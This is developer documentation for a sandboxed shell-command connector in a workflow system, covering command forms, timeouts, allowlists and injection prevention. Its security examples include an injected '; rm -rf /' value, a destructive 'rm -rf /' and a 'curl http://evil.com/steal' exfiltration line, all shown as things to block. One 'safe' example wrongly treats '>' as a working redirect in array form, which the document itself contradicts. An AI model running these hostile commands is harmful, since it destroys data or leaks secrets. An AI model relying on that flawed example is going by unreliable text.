# Shell

The `shell` connector provides secure, sandboxed shell command execution for workflows.

## Overview

The shell connector is a **builtin connector** - it requires no configuration and is always available. It executes commands with security controls including timeouts, command allowlists, and sandboxing.

**Security Model:**
- Commands run in isolated sandboxed environment (when available)
- 30-second default timeout prevents runaway processes
- Optional command allowlist for production workflows
- Environment variable filtering for sensitive data protection
- Working directory isolation

## Operations

### shell.run

Execute a shell command and capture output.

**Parameters:**

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `command` | string or array | Yes | Command to execute |
| `args` | array | No | Command arguments (deprecated - use array form of `command`) |

**Command Forms:**

#### String Form (Simple)

Use for static commands without user input:

```yaml
- shell.run: "git status"
- shell.run: "ls -la /tmp"
- shell.run: "npm install"
```

**Caution:** String form passes the command through shell interpretation. Never use with untrusted input:

```yaml
# DANGEROUS - Command injection risk!
- shell.run: "git commit -m '{{.inputs.user_message}}'"
```

#### Array Form (Secure)

Use for commands with dynamic input or user-provided data:

```yaml
# SAFE - Arguments are NOT shell-interpreted
- shell.run:
    command: ["git", "commit", "-m", "{{.inputs.user_message}}"]

# Complex example with multiple arguments
- shell.run:
    command: ["docker", "run", "--name", "{{.inputs.container_name}}", "alpine", "echo", "{{.inputs.message}}"]
```

**Benefits of Array Form:**
- **Prevents command injection** - arguments are passed directly to command, not through shell
- **Handles special characters** - spaces, quotes, and shell metacharacters are safe
- **More explicit** - clear separation between command and arguments

---

## Examples

### Basic Command Execution

```yaml
steps:
  # Check Git status
  - id: git_status
    shell.run: "git status --short"

  # Run tests
  - id: run_tests
    shell.run: "go test ./..."
```

### Working with Output

```yaml
steps:
  # Get current branch name
  - id: get_branch
    shell.run:
      command: ["git", "rev-parse", "--abbrev-ref", "HEAD"]

  # Use output in next step
  - id: notify
    type: llm
    prompt: "Create a commit message for branch: {{.steps.get_branch.stdout}}"
```

### Command with Dynamic Arguments

```yaml
steps:
  # Safe: Array form prevents injection
  - id: commit_changes
    shell.run:
      command: ["git", "commit", "-m", "{{.inputs.commit_message}}"]

  # Safe: Even with special characters in input
  - id: create_file
    shell.run:
      command: ["echo", "{{.inputs.content}}", ">", "{{.inputs.filename}}"]
```

### Multi-Step Git Workflow

```yaml
name: git-branch-analysis
description: "Analyze changes in a Git branch"

inputs:
  - name: base_branch
    type: string
    required: true
    description: "Base branch to compare against (e.g., main)"

steps:
  # Get current branch
  - id: get_branch
    shell.run:
      command: ["git", "rev-parse", "--abbrev-ref", "HEAD"]

  # Get commit log
  - id: get_commits
    shell.run:
      command: ["git", "log", "{{.inputs.base_branch}}..HEAD", "--oneline"]

  # Get file diff stats
  - id: get_diff_stat
    shell.run:
      command: ["git", "diff", "{{.inputs.base_branch}}...HEAD", "--stat"]

  # Analyze changes
  - id: analyze
    type: llm
    model: balanced
    prompt: |
      Analyze these Git changes:

      Branch: {{.steps.get_branch.stdout}}
      Base: {{.inputs.base_branch}}

      Commits:
      {{.steps.get_commits.stdout}}

      Files Changed:
      {{.steps.get_diff_stat.stdout}}

      Provide a summary of the changes.
```

### Error Handling

```yaml
steps:
  # Attempt to run tests
  - id: run_tests
    shell.run: "go test ./..."
    on_error:
      strategy: ignore

  # Check test results
  - id: check_tests
    type: condition
    condition:
      expression: "$.run_tests.exit_code == 0"
      then_steps: [tests_passed]
      else_steps: [tests_failed]

  - id: tests_passed
    type: llm
    prompt: "Tests passed! {{.steps.run_tests.stdout}}"

  - id: tests_failed
    type: llm
    prompt: "Tests failed with errors: {{.steps.run_tests.stderr}}"
```

### CI/CD Pipeline Example

```yaml
name: build-and-deploy
description: "Build, test, and deploy application"

steps:
  # Install dependencies
  - id: install
    shell.run: "npm install"

  # Run linter
  - id: lint
    shell.run: "npm run lint"

  # Run tests
  - id: test
    shell.run: "npm test"

  # Build application
  - id: build
    shell.run: "npm run build"

  # Check build artifacts
  - id: check_artifacts
    shell.run:
      command: ["ls", "-lh", "dist/"]

  # Analyze results
  - id: analyze
    type: llm
    prompt: |
      Build completed successfully:

      Lint: {{if eq .steps.lint.exit_code 0}}✓ Passed{{else}}✗ Failed{{end}}
      Tests: {{if eq .steps.test.exit_code 0}}✓ Passed{{else}}✗ Failed{{end}}
      Build: {{if eq .steps.build.exit_code 0}}✓ Success{{else}}✗ Failed{{end}}

      Artifacts:
      {{.steps.check_artifacts.stdout}}

      Create a deployment summary.
```

---

## Response Format

All `shell.run` operations return:

```yaml
response:
  success: true              # true if exit code = 0
  stdout: "command output"   # Standard output
  stderr: ""                 # Standard error
  exit_code: 0               # Exit code from command
  status: "completed"        # completed, timeout, or error
```

### Response Fields

| Field | Type | Description |
|-------|------|-------------|
| `success` | boolean | `true` if exit code is 0, `false` otherwise |
| `stdout` | string | Standard output from the command |
| `stderr` | string | Standard error from the command |
| `exit_code` | number | Command exit code (0 = success) |
| `status` | string | Execution status: `completed`, `timeout`, or `error` |

### Accessing Response Fields

```yaml
steps:
  - id: run_command
    shell.run: "some-command"

  # Check if successful
  - id: check
    type: condition
    condition:
      expression: "$.run_command.success == true"
      then_steps: [handle_success]
      else_steps: [handle_failure]

  # Access stdout
  - id: use_output
    type: llm
    prompt: "Command output: {{.steps.run_command.stdout}}"

  # Check exit code
  - id: check_code
    type: condition
    condition:
      expression: "$.run_command.exit_code == 0"
      then_steps: [continue]
```

---

## Timeouts

Default timeout: **30 seconds**

Commands that exceed the timeout are terminated and return:

```yaml
response:
  success: false
  stdout: "partial output..."
  stderr: "signal: killed"
  exit_code: -1
  status: "timeout"
```

**Handling Timeouts:**

```yaml
- id: long_build
  shell.run: "npm run build"
  timeout: 300  # 5 minutes
  on_error:
    strategy: retry
  retry:
    max_attempts: 2
```

---

## Security

### Command Injection Prevention

**ALWAYS use array form when working with user input:**

```yaml
# DANGEROUS - Vulnerable to injection
- shell.run: "rm -rf {{.inputs.path}}"  # User can provide "; rm -rf /"

# SAFE - Array form prevents injection
- shell.run:
    command: ["rm", "-rf", "{{.inputs.path}}"]
```

### Command Allowlist

For production workflows, restrict allowed commands:

```yaml
# config.yaml (runtime configuration)
builtin_tools:
  shell:
    allowed_commands:
      - git
      - npm
      - go
      - docker
    # Commands not in list will be blocked
```

**With allowlist enabled:**

```yaml
# Allowed
- shell.run: "git status"
- shell.run: ["npm", "install"]

# Blocked
- shell.run: "curl http://evil.com/steal"  # curl not in allowlist
- shell.run: ["rm", "-rf", "/"]            # rm not in allowlist
```

### Sandboxing

Shell commands run in a sandboxed environment when available:

- **Filesystem isolation**: Limited access to workflow directory
- **Network isolation**: Controlled network access (configurable)
- **Resource limits**: CPU and memory limits
- **Process isolation**: Cannot access other processes

**Security Configuration:**

```yaml
# config.yaml (runtime configuration)
builtin_tools:
  shell:
    timeout: 30s
    allowed_commands: [git, npm, go, make]
    working_dir: /workflow  # Isolated working directory
    sandbox:
      enable: true
      allow_network: false
      max_memory: 512MB
      max_cpu_percent: 80
```

### Environment Variables

Sensitive environment variables are **automatically filtered** from command output:

- `*_TOKEN`
- `*_SECRET`
- `*_KEY`
- `*_PASSWORD`
- `*_CREDENTIAL`

**Passing Environment Variables:**

Environment variables from the workflow execution context are available to commands:

```yaml
# Environment variables are inherited
- shell.run: "git push"  # Uses GIT_TOKEN if set in environment
```

---

## Working Directory

Commands execute in the **workflow directory** by default (the directory containing `workflow.yaml`).

**Change working directory:**

```yaml
# Runtime configuration
builtin_tools:
  shell:
    working_dir: /custom/path
```

**Relative paths in commands:**

```yaml
# These paths are relative to workflow directory
- shell.run: "cat ./config.json"
- shell.run: "ls ./src"
```

---

## Exit Codes

Common exit codes and their meanings:

| Code | Meaning |
|------|---------|
| `0` | Success |
| `1` | General error |
| `2` | Misuse of shell command |
| `126` | Command cannot execute |
| `127` | Command not found |
| `130` | Terminated by Ctrl+C |
| `137` | Killed (SIGKILL) |
| `143` | Terminated (SIGTERM) |
| `-1` | Timeout or internal error |

**Check specific exit codes:**

```yaml
- id: check_exit
  type: condition
  condition:
    expression: "$.run_command.exit_code == 127"
    then_steps: [command_not_found_handler]
```

---

## Error Handling

### Ignore Errors

Continue workflow even if command fails:

```yaml
- id: optional_step
  shell.run: "make lint"
  on_error:
    strategy: ignore
```

### Retry on Failure

```yaml
- id: flaky_test
  shell.run: "npm test"
  retry:
    max_attempts: 3
    backoff_base: 2
    backoff_multiplier: 2.0
```

### Fallback Handler

```yaml
- id: try_primary
  shell.run: "curl https://api.primary.com/data"
  on_error:
    strategy: fallback
    fallback_step: use_backup

- id: use_backup
  shell.run: "curl https://api.backup.com/data"
```

---

## Best Practices

### 1. Use Array Form for Security

```yaml
# GOOD - Safe from injection
- shell.run:
    command: ["git", "commit", "-m", "{{.inputs.message}}"]

# RISKY - Vulnerable to injection
- shell.run: "git commit -m '{{.inputs.message}}'"
```

### 2. Set Appropriate Timeouts

```yaml
# Default (30s) - Fine for most commands
- shell.run: "git status"

# Longer timeout for builds
- shell.run: "cargo build --release"
  timeout: 600  # 10 minutes

# Short timeout for quick checks
- shell.run: "ping -c 1 example.com"
  timeout: 5
```

### 3. Handle Errors Appropriately

```yaml
# Critical step - fail workflow on error
- shell.run: "npm run build"

# Optional step - continue on failure
- shell.run: "npm run lint"
  on_error:
    strategy: ignore

# Retry flaky operations
- shell.run: "npm install"
  retry:
    max_attempts: 3
```

### 4. Check Exit Codes

```yaml
# Don't assume success
- id: build
  shell.run: "make build"

- id: verify
  type: condition
  condition:
    expression: "$.build.exit_code == 0"
    then_steps: [deploy]
    else_steps: [notify_failure]
```

### 5. Capture and Use Output

```yaml
- id: get_version
  shell.run:
    command: ["git", "describe", "--tags"]

- id: tag_release
  shell.run:
    command: ["docker", "tag", "myapp", "myapp:{{.steps.get_version.stdout}}"]
```

---

## Limitations

- **No interactive commands**: Commands requiring user input (like `ssh` without keys) will hang until timeout
- **No shell features in array form**: Pipes (`|`), redirects (`>`), and shell expansions don't work in array form
- **Output size limits**: Very large outputs (>10MB) may be truncated
- **No background processes**: Commands must complete; background processes (`&`) are not supported

### Shell Features Workaround

Use string form for shell features, but only with trusted input:

```yaml
# Pipes and redirection (string form required)
- shell.run: "git log --oneline | head -n 5"
- shell.run: "echo 'data' > output.txt"

# Variable expansion
- shell.run: "echo $HOME"

# For dynamic input, use intermediate steps
- id: write_file
  file.write:
    path: $temp/input.txt
    content: "{{.inputs.user_data}}"

- id: process_safe
  shell.run: "cat $temp/input.txt | jq .field"
```

---

## Related

- [File Connector](file.md) - Filesystem operations
- [HTTP Connector](http.md) - Make HTTP requests
- [Workflow Schema Reference](../workflow-schema.md) - Complete workflow YAML schema
- [Security Documentation](../../operations/security.md) - Security best practices
